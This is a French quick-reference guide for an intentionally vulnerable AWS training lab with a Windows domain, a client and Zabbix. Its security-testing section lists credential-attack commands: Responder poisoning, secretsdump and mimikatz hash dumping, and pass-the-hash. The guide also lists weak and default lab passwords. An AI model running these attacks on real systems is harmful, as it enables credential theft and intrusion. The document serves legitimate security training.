# 📚 Guide de référence rapide

## 🚀 Commandes de déploiement

```bash
# Déploiement complet
make init && make plan && make deploy

# Voir les informations de connexion
terraform output summary
terraform output security_testing_info
```

## 🔍 Vérification rapide

### Infrastructure AWS
```bash
# Statut des instances
aws ec2 describe-instances --filters "Name=tag:Project,Values=domain-controller"

# IPs publiques
terraform output | grep "_ip"
```

### Domain Controller
```powershell
# Sur le DC via RDP
Get-ADDomain
Get-Service ADWS,DNS,Netlogon
Get-DnsServerZone
```

### Client Windows
```powershell
# Sur le client via RDP
whoami /fqdn
nltest /dsgetdc:school.local
Get-Service "Zabbix Agent"
```

### Zabbix
```bash
# Interface web
http://<ZABBIX_IP>/zabbix
# Login: Admin / zabbix

# SSH diagnostic
ssh -i .config/keys/domain-controller-key.pem ubuntu@<ZABBIX_IP>
sudo systemctl status zabbix-server
```

## 🛡️ Tests de sécurité

### Responder Attack
```bash
# Sur Kali Linux
sudo responder -I eth0 -wrf
```

### Hash Dumping
```bash
# Avec impacket
secretsdump.py school.local/testuser:Password123@<CLIENT_IP>

# Avec mimikatz (sur le client)
.\mimikatz.exe "sekurlsa::logonpasswords"
```

### Pass-the-Hash
```bash
pth-winexe -U school.local/testuser%<HASH> //<CLIENT_IP> cmd
```

## 📊 IPs et Accès

| Composant | IP Privée | Accès | Credentials |
|-----------|-----------|-------|-------------|
| **DC** | 10.0.1.10 | RDP:3389 | SCHOOL\Administrator |
| **Zabbix** | 10.0.1.20 | Web:80, SSH:22 | Admin/zabbix |
| **Client** | 10.0.1.30 | RDP:3389 | SCHOOL\Administrator |

## 👤 Comptes de test

| Utilisateur | Mot de passe | Type |
|-------------|--------------|------|
| Administrator | SchoolProject2024! | Domaine |
| testuser | Password123 | Local |
| serviceaccount | Service123 | Local |
| backup_admin | backup123 | Local |

## 🔧 Troubleshooting

### Client ne joint pas le domaine
```powershell
# Reconfigurer DNS
$adapter = Get-NetAdapter | Where {$_.Status -eq "Up"}
Set-DnsClientServerAddress -InterfaceIndex $adapter.InterfaceIndex -ServerAddresses "10.0.1.10"

# Rejoindre manuellement
Add-Computer -DomainName "school.local" -Credential (Get-Credential) -Restart
```

### Zabbix agent non connecté
```powershell
# Windows
Restart-Service "Zabbix Agent"
Test-NetConnection -ComputerName <ZABBIX_IP> -Port 10051
```

### Logs utiles
```bash
# DC
C:\Windows\debug\netlogon.log

# Client
C:\client-setup.log

# Zabbix
/var/log/zabbix/zabbix_server.log
```

## 🧹 Nettoyage

```bash
# Détruire l'infrastructure
make destroy

# Confirmer la suppression
terraform destroy -auto-approve
```

## ⚠️ Sécurité

- ❌ Configuration vulnérable intentionnelle
- ✅ Uniquement pour formation
- 🔒 Ne pas utiliser en production 